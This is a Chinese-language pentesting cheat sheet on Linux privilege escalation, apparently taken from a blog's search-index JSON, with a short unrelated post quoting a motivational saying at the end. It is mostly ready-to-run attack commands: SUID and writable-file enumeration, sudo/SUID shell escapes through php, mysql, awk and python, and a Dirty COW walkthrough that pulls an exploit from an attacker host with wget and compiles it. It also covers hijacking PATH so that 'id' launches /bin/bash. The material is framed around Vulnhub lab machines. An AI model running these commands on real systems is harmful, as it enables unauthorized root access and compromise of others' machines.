suid\nSUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。\n\nfind / -perm -u=s -type f 2>/dev/null //查询具有suid执行权限程序\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;\n可利用的程序：nmap、vim/vi、find、bash、more、less、nano、cp、wget、python、mawk  \n\n\n3. 通过在/etc/passwd添加一个root权限账户find / -writable -type f 2>/dev/null //查询可写权限的文件\n\n\n4. 查看/etc/cron*下所含的所有文件ls -la /etc/cron* //cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。\ncat /etc/crontab\n\n提权\n1. php\nsudoCMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\nsuidsudo sh -c 'cp $(which php) .; chmod +s ./php'\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh',['-p']);\"\n\n\n\n\n2. mysql\nsudosudo -u root mysql -e &#39;\\! /bin/bash&#39;  \n\n\n\n3. awk/mawk\nsudosudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;  \nsuidmawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;\n\n\n\n4. python\nsudosudo python3 -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;\nsuidpython3 -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;  \n\n\n\n5.脏牛提权\n使用实例：Vulnhub|Lampiao、Vulnhub|Sumo  \n\n把脏牛漏洞扫描器，上传到靶机上。(ssh/wget)\n\nscp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。scp ~/dirtycowscan.sh &lt;ssh_user&gt;@&lt;目标ip&gt;:&lt;目标路径&gt;  \n\n攻击机开启apache，把需要传输的文件放到 /var/www/html。靶机要在 /tmp才有 wget权限!!!。wget http://192.168.117.129/dirtycowscan.sh   \n\n\n靶机运行脏牛漏洞扫描脚本./dirtycowscan.sh，查看返回结果是否IS vulnerable。查看靶机的编译环境gcc -v``、g++ -v`……；在攻击机找expsearchsploit dirty`，找到对应合适的脚本，同样用scp或wget将 /usr/share/exploits/&lt;脚本所在path&gt; 传到靶机上。在靶机上编译运行脚本：  \n\n编译源代码：cat &lt;上传的脚本&gt; | grep g++–找到编译语句，如g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil进行编译。运行编译成的文件：如./dcow。  \n\n\n6.劫持环境变量提权\n\n使用实例：Vulnhub|DarkHole1  \n\n\n概念：可通过$PATH查看当前系统下的环境变量，$PATH(一定是大写)这个变量的内容是由一堆目录所组成的，每个目录中间用冒号(:)来隔开，每个目录是有顺序的由左至右，优先级变低，新增的目录置于最左侧。条件：存在可执行文件为系统命令 (因为system函数是继承环境变量，通过替换环境变量可以达到执行任意命令)，且具有s权限 (s权限： 设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份)，且uid为关键用户。  \n\n操作：（以系统命令id为例）创建一个id命令文件并赋权：echo &quot;/bin/bash&quot;&gt;/tmp/id &amp;&amp; chmod 777 id把当前目录/tmp增加到环境变量中：export PATH=/tmp:$PATH环境变量PATH设置后，执行id命令时会优先从/tmp下查找程序，故id命令会被劫持(即期望执行的是id，但实际执行的是id文件中的命令/bin/bash)。过程：其他用户执行可执行文件(./xxx)-执行系统命令(id)-以uid的身份执行恶意命令(/bin/bash)-获得uid身份的shell。  \n\n","categories":["渗透测试"],"tags":["提权"]},{"title":"Stay sharp, stay alone.","url":"/b822f9c7.html","content":"以前从别人那听来的一段话：“Your time and energy are scarce resources. Do not waste them on trivial people or things. Do not answer unjustified questions, or reply curious comments. Ignore them all. Spend more time with wise peers. Read sparkling thoughts on books. Stay sharp, stay alone. “\n","categories":["随记"],"tags":[]}]